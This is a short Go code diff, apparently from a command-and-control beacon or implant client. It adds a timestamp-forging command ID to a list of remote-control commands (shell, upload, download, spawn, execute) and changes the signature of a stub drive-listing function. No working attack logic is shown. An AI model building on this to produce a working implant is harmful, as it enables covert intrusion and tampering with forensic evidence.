@@ -58,17 +58,17 @@ const (
 )
 
 const (
-	CMD_TYPE_SLEEP        = 4
-	CMD_TYPE_PAUSE        = 47
-	CMD_TYPE_SHELL        = 78
-	CMD_TYPE_UPLOAD_START = 10
-	CMD_TYPE_UPLOAD_LOOP  = 67
-	CMD_TYPE_DOWNLOAD     = 11
-	CMD_TYPE_EXIT         = 3
-	CMD_TYPE_CD           = 5
-	CMD_TYPE_PWD          = 39
-	CMD_TYPE_FILE_BROWSE  = 53
-
+	CMD_TYPE_SLEEP                      = 4
+	CMD_TYPE_PAUSE                      = 47
+	CMD_TYPE_SHELL                      = 78
+	CMD_TYPE_UPLOAD_START               = 10
+	CMD_TYPE_UPLOAD_LOOP                = 67
+	CMD_TYPE_DOWNLOAD                   = 11
+	CMD_TYPE_EXIT                       = 3
+	CMD_TYPE_CD                         = 5
+	CMD_TYPE_PWD                        = 39
+	CMD_TYPE_FILE_BROWSE                = 53
+	CMD_TYPE_TIMESTOMP                  = 29
 	CMD_TYPE_SPAWN_X64                  = 44
 	CMD_TYPE_SPAWN_X86                  = 1
 	CMD_TYPE_EXECUTE                    = 12
@@ -330,7 +330,7 @@ func PathExists(path string) bool {
 	return false
 }
 
-func Drives() ([]byte, error) {
+func Drives(b []byte) ([]byte, error) {
 	return nil, errors.New("This function is not supported on this platform now.")
 }
 
